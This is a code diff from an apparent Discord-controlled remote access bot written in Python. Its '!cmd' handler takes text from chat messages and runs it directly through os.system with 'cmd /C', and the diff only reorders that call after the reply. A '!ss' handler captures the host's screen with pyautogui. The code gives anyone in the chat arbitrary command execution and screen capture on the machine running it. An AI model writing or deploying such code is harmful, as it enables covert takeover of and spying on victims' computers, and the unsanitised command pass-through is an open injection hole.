@@ -27,8 +27,8 @@ class MyClient(discord.Client):
             for x in command:
                 if x!="!cmd":
                     l += x + " "
-            os.system('cmd /C '+l)
             await message.reply("Executed ``"+l+"``", mention_author=True)
+            os.system('cmd /C '+l)
 
         if message.content.startswith("!ss"):
             image = pyautogui.screenshot()
